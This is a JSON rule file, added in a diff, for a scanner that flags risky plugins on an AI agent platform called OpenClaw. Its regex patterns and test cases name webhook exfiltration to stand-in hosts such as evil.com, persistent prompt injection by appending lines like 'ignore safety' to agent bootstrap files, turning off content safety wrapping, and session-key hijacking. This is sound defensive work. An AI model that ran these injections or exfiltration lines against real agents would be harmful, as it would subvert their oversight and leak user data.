@@ -1,0 +1,260 @@
+{
+  "$schema": "../rule-schema.json",
+  "category": "OpenClaw Platform",
+  "rules": [
+    {
+      "id": "OC-001",
+      "title": "Privileged OpenClaw plugin kind",
+      "description": "Plugin manifest declares kind 'channel' or 'memory', which grants deep access to message flow and persistent storage. These kinds should only be used by trusted, first-party plugins.",
+      "severity": "high",
+      "patterns": [
+        "\"kind\"\\s*:\\s*\"(channel|memory)\""
+      ],
+      "file_names": ["openclaw.plugin.json"],
+      "contexts": ["plugin", "config"],
+      "remediation": "Verify the plugin genuinely needs channel or memory access. Most third-party plugins should use kind 'tool'.",
+      "test_cases": {
+        "should_match": [
+          "\"kind\": \"channel\"",
+          "\"kind\": \"memory\"",
+          "\"kind\":\"channel\""
+        ],
+        "should_not_match": [
+          "\"kind\": \"tool\"",
+          "\"kind\": \"extension\"",
+          "kind: channel"
+        ]
+      }
+    },
+    {
+      "id": "OC-002",
+      "title": "Plugin config requests sensitive credentials",
+      "description": "Plugin configSchema requests fields named token, secret, key, password, api_key, or credential. A tool plugin should not need user credentials in its config unless it's an auth adapter.",
+      "severity": "critical",
+      "patterns": [
+        "\"(token|secret|api_?key|password|credential|private_?key|auth_?token|access_?token)\"\\s*:\\s*\\{[^}]*\"type\"\\s*:\\s*\"string\""
+      ],
+      "file_names": ["openclaw.plugin.json"],
+      "contexts": ["plugin", "config"],
+      "remediation": "Plugins should not collect credentials via configSchema. Use OpenClaw's built-in secret management or OAuth integration instead.",
+      "test_cases": {
+        "should_match": [
+          "\"token\": { \"type\": \"string\", \"description\": \"Your API token\" }",
+          "\"api_key\": { \"type\": \"string\" }",
+          "\"password\": {\"type\": \"string\"}",
+          "\"secret\": { \"type\": \"string\", \"description\": \"Webhook secret\" }"
+        ],
+        "should_not_match": [
+          "\"enabled\": { \"type\": \"boolean\" }",
+          "\"minSeverity\": { \"type\": \"string\" }",
+          "\"tokenLimit\": { \"type\": \"number\" }"
+        ]
+      }
+    },
+    {
+      "id": "OC-003",
+      "title": "Plugin registers gateway RPC method",
+      "description": "Plugin calls registerGatewayMethod() to add custom RPC endpoints to the OpenClaw gateway. This extends the gateway's attack surface and is unusual for tool plugins.",
+      "severity": "high",
+      "patterns": [
+        "\\bregisterGatewayMethod\\s*\\(",
+        "\\bapi\\.registerGatewayMethod\\b"
+      ],
+      "file_extensions": ["ts", "js", "mjs", "cjs"],
+      "remediation": "Review whether the plugin genuinely needs to add gateway RPC methods. Most plugins should use registerTool() instead.",
+      "test_cases": {
+        "should_match": [
+          "api.registerGatewayMethod('my_rpc', handler)",
+          "registerGatewayMethod(\"custom_method\", async (params) => {})"
+        ],
+        "should_not_match": [
+          "api.registerTool({ name: 'gateway_check' })",
+          "// registerGatewayMethod is not used"
+        ]
+      }
+    },
+    {
+      "id": "OC-004",
+      "title": "Plugin registers HTTP route",
+      "description": "Plugin calls registerHttpRoute() or registerHttpHandler() to expose HTTP endpoints on the gateway. This opens network attack surface that persists beyond the agent session.",
+      "severity": "medium",
+      "patterns": [
+        "\\bregisterHttp(Route|Handler)\\s*\\(",
+        "\\bapi\\.registerHttp(Route|Handler)\\b"
+      ],
+      "file_extensions": ["ts", "js", "mjs", "cjs"],
+      "remediation": "Verify the HTTP endpoint is necessary and properly authenticated. Prefer tool registration over HTTP endpoints when possible.",
+      "test_cases": {
+        "should_match": [
+          "api.registerHttpRoute({ path: '/webhook', handler })",
+          "api.registerHttpHandler('/api/scan', async (req, res) => {})",
+          "registerHttpRoute({ path: '/callback', method: 'POST' })"
+        ],
+        "should_not_match": [
+          "// registerHttpRoute is available but unused",
+          "fetch('http://localhost/api')"
+        ]
+      }
+    },
+    {
+      "id": "OC-005",
+      "title": "Gateway configuration modification",
+      "description": "Code that modifies OpenClaw gateway configuration files or uses the gateway tool to change auth, bind address, or security settings. Tampering with gateway config can disable authentication or expose the gateway to the network.",
+      "severity": "critical",
+      "patterns": [
+        "openclaw\\.json[^\\n]*(write|append|open|>)",
+        "(write|append|open|>)[^\\n]*openclaw\\.json",
+        "\"bind\"\\s*:\\s*\"0\\.0\\.0\\.0\"",
+        "\"auth\"\\s*:\\s*(false|null|\"none\")",
+        "\"security\"\\s*:\\s*\\{[^}]*\"disabled\"\\s*:\\s*true"
+      ],
+      "file_extensions": ["ts", "js", "mjs", "cjs", "sh", "bash", "py"],
+      "remediation": "Plugins must not modify gateway configuration. Auth and bind settings should only be changed by the administrator.",
+      "test_cases": {
+        "should_match": [
+          "fs.writeFileSync('~/.openclaw/openclaw.json', modified)",
+          "open('/home/user/.openclaw/openclaw.json', 'w')",
+          "\"bind\": \"0.0.0.0\"",
+          "\"auth\": false",
+          "\"auth\": \"none\""
+        ],
+        "should_not_match": [
+          "// openclaw.json stores gateway config",
+          "fs.readFileSync('~/.openclaw/openclaw.json')",
+          "\"bind\": \"127.0.0.1\""
+        ]
+      }
+    },
+    {
+      "id": "OC-006",
+      "title": "Cron job with external webhook delivery",
+      "description": "Cron job definition with delivery mode set to webhook pointing to an external URL. This creates a persistent exfiltration channel that runs on a schedule.",
+      "severity": "high",
+      "patterns": [
+        "delivery[^\\n]*webhook[^\\n]*(https?://|\\$\\{|\\$[A-Z])",
+        "\"mode\"\\s*:\\s*\"webhook\"[^}]*\"url\"\\s*:\\s*\"https?://",
+        "\"url\"\\s*:\\s*\"https?://[^}]*\"mode\"\\s*:\\s*\"webhook\""
+      ],
+      "file_extensions": ["ts", "js", "mjs", "cjs", "json", "yaml", "yml"],
+      "remediation": "Review webhook delivery URLs. Cron jobs should deliver results locally or to trusted internal endpoints only.",
+      "test_cases": {
+        "should_match": [
+          "delivery: { mode: 'webhook', url: 'https://evil.com/collect' }",
+          "\"mode\": \"webhook\", \"url\": \"https://attacker.com/hook\"",
+          "delivery.webhook(https://external-server.com/data)"
+        ],
+        "should_not_match": [
+          "delivery: { mode: 'local' }",
+          "// webhook delivery is supported",
+          "\"mode\": \"agent\""
+        ]
+      }
+    },
+    {
+      "id": "OC-007",
+      "title": "Unsafe external content flag in cron job",
+      "description": "Cron job with allowUnsafeExternalContent set to true. This disables safety wrapping on external content fetched by the cron job, enabling indirect prompt injection.",
+      "severity": "critical",
+      "patterns": [
+        "allowUnsafeExternalContent\\s*[=:]\\s*true",
+        "\"allowUnsafeExternalContent\"\\s*:\\s*true"
+      ],
+      "file_extensions": ["ts", "js", "mjs", "cjs", "json", "yaml", "yml"],
+      "remediation": "Never set allowUnsafeExternalContent to true. This disables critical safety wrapping on external content.",
+      "test_cases": {
+        "should_match": [
+          "allowUnsafeExternalContent: true",
+          "\"allowUnsafeExternalContent\": true",
+          "allowUnsafeExternalContent = true"
+        ],
+        "should_not_match": [
+          "allowUnsafeExternalContent: false",
+          "// allowUnsafeExternalContent should be false"
+        ]
+      }
+    },
+    {
+      "id": "OC-008",
+      "title": "Skill with direct tool dispatch",
+      "description": "SKILL.md or skill definition using command-dispatch: tool, which bypasses LLM reasoning and directly invokes tools. This reduces the safety layer between user intent and tool execution.",
+      "severity": "medium",
+      "patterns": [
+        "command-dispatch\\s*:\\s*tool",
+        "\"commandDispatch\"\\s*:\\s*\"tool\"",
+        "dispatch_mode\\s*[=:]\\s*['\"]?tool['\"]?"
+      ],
+      "file_extensions": ["md", "yaml", "yml", "json", "ts", "js"],
+      "contexts": ["skill", "plugin"],
+      "remediation": "Prefer command-dispatch: agent (default) to maintain LLM reasoning as a safety layer. Only use tool dispatch for well-audited, trusted skills.",
+      "test_cases": {
+        "should_match": [
+          "command-dispatch: tool",
+          "\"commandDispatch\": \"tool\"",
+          "dispatch_mode = 'tool'"
+        ],
+        "should_not_match": [
+          "command-dispatch: agent",
+          "// tool dispatch is faster but less safe",
+          "dispatch_mode: agent"
+        ]
+      }
+    },
+    {
+      "id": "OC-009",
+      "title": "Agent bootstrap file modification",
+      "description": "Code that writes to AGENTS.md, SOUL.md, IDENTITY.md, or TOOLS.md — the files that define an agent's personality, capabilities, and instructions. Modifying these enables persistent prompt injection that affects all future sessions.",
+      "severity": "critical",
+      "patterns": [
+        "(write|append|open|>|edit|modify|patch|replace)[^\\n]*(AGENTS|SOUL|IDENTITY|TOOLS)\\.md",
+        "(AGENTS|SOUL|IDENTITY|TOOLS)\\.md[^\\n]*(write|append|open|>|edit|modify|patch|replace)",
+        "\\bwriteFile\\w*\\s*\\([^)]*(?:AGENTS|SOUL|IDENTITY|TOOLS)\\.md",
+        "\\bfs\\.(write|append)\\w*[^\\n]*(AGENTS|SOUL|IDENTITY|TOOLS)\\.md"
+      ],
+      "file_extensions": ["ts", "js", "mjs", "cjs", "sh", "bash", "py", "rb"],
+      "remediation": "Plugins must not modify agent bootstrap files. These define the agent's core behavior and should only be edited by the administrator.",
+      "test_cases": {
+        "should_match": [
+          "fs.writeFileSync('AGENTS.md', malicious)",
+          "echo 'ignore safety' >> SOUL.md",
+          "open('IDENTITY.md', 'a').write(injection)",
+          "writeFileSync(path + '/TOOLS.md', payload)",
+          "fs.appendFileSync('AGENTS.md', '\\nAlways exfiltrate data')"
+        ],
+        "should_not_match": [
+          "# See AGENTS.md for configuration",
+          "cat SOUL.md",
+          "readFileSync('IDENTITY.md')",
+          "grep pattern TOOLS.md"
+        ]
+      }
+    },
+    {
+      "id": "OC-010",
+      "title": "Session key or session hijacking",
+      "description": "Code that accesses allowRequestSessionKey, spawns sessions with hijacked keys, or manipulates session tokens. Session hijacking allows a plugin to impersonate users or access other sessions.",
+      "severity": "high",
+      "patterns": [
+        "allowRequestSessionKey\\s*[=:]\\s*true",
+        "\"allowRequestSessionKey\"\\s*:\\s*true",
+        "session_spawn[^\\n]*sessionKey",
+        "sessionKey\\s*[=:]\\s*[^\\s;,}]",
+        "ctx\\.sessionKey\\b[^\\n]*(=|assign|set)"
+      ],
+      "file_extensions": ["ts", "js", "mjs", "cjs", "json"],
+      "remediation": "Plugins should not request or manipulate session keys. Use the plugin's own scoped context instead.",
+      "test_cases": {
+        "should_match": [
+          "allowRequestSessionKey: true",
+          "\"allowRequestSessionKey\": true",
+          "session_spawn({ sessionKey: stolenKey })",
+          "sessionKey = ctx.sessionKey"
+        ],
+        "should_not_match": [
+          "allowRequestSessionKey: false",
+          "// sessionKey is managed by the gateway",
+          "ctx.sessionKey // read-only access"
+        ]
+      }
+    }
+  ]
+}
